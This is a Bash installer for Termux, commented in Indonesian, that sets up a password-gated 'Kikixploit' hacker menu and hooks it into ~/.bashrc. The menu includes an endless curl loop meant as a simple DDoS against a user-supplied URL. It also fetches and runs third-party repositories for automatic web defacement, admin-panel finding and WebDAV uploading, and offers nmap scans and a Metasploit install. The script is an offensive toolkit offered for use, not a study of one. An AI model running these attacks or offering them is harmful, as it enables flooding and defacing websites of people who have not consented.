
#!/bin/bash

# Warna
biru="\e[34m"
normal="\e[0m"

# Password login
password="KIKI28"

# Cek password
clear
echo -e "$biru"
read -sp "Masukkan Password: " user_pass
echo
if [ "$user_pass" != "$password" ]; then
    echo -e "\e[31mPassword salah! Akses ditolak."
    exit 1
fi

# Update dan install tools
pkg update -y && pkg upgrade -y
pkg install figlet toilet neofetch curl git nmap python termux-api pv -y

# ASCII Art
cat << 'EOF' > ~/hacker_symbol.txt
      .-'''-.
     / .===. \
     \/ 6 6 \/
     ( \___/ )
___ooo__V__ooo___
EOF

cat << 'EOF' > ~/kikixploit_logo.txt
  _  ___ _  __  _       _ _       
 | |/ (_) |/ / (_)     (_) |      
 | ' / _| ' /   _ _ __  _| |_ ___ 
 | < | |  <| | '_ \| | __/ _ \
 | . \| | . \ | | | | | ||  __/
 |_|\_\_|_|\_\ |_| |_|_|\__\___|
EOF

# Menu Tools
cat << 'EOF' > ~/kikixploit_menu.sh
#!/bin/bash
echo -e "\e[34m"
echo "======== Menu Tools Kikixploit ========"
echo "[1] Info IP Publik"
echo "[2] Ping Google"
echo "[3] Scan Port (nmap)"
echo "[4] DDoS Sederhana (curl loop)"
echo "[5] Deface Web Otomatis (LITESCRIPT)"
echo "[6] Auto Exploit Cek"
echo "[7] Admin Finder"
echo "[8] WebDAV Uploader"
echo "[9] Install Metasploit"
echo "[10] Update Sistem"
echo "[11] Exit"
echo "======================================="
read -p "Pilih menu: " pilih

case $pilih in
    1) curl ifconfig.me ;;
    2) ping -c 4 google.com ;;
    3) read -p "Target IP: " ip && nmap $ip ;;
    4) read -p "Target URL: " url && while true; do curl -s $url > /dev/null; done ;;
    5) git clone https://github.com/4L13199/LITESCRIPT && cd LITESCRIPT && bash LITESCRIPT.sh ;;
    6) read -p "Target IP: " target; nmap -sV $target ;;
    7) git clone https://github.com/the-c0d3r/admin-finder.git && cd admin-finder && python3 admin-finder.py ;;
    8) git clone https://github.com/khaled-sherif/webdav-uploader.git && cd webdav-uploader && python3 webdav.py ;;
    9) pkg install unstable-repo && pkg install metasploit ;;
    10) pkg update && pkg upgrade -y ;;
    11) echo "Bye Hacker!" && exit ;;
    *) echo "Menu tidak ditemukan!" ;;
esac
echo -e "\e[0m"
EOF

chmod +x ~/kikixploit_menu.sh

# Skrip tampilan awal
cat << 'EOF' > ~/welcome.sh
clear
echo -e "\a"
termux-vibrate -d 100
echo -e "\e[34m"
cat ~/hacker_symbol.txt
toilet -f slant "KIKIXPLOIT"
cat ~/kikixploit_logo.txt
echo
echo "      [+] Developer Kikixploit +]"
echo
neofetch --ascii_distro Ubuntu
echo
bash ~/kikixploit_menu.sh
echo -e "\e[0m"
EOF

# Tambahkan ke .bashrc
sed -i '/welcome.sh/d' ~/.bashrc
echo "bash ~/welcome.sh" >> ~/.bashrc

echo -e "\e[32mInstalasi selesai! Ketik 'exit' lalu buka kembali Termux untuk melihat hasilnya.\e[0m"
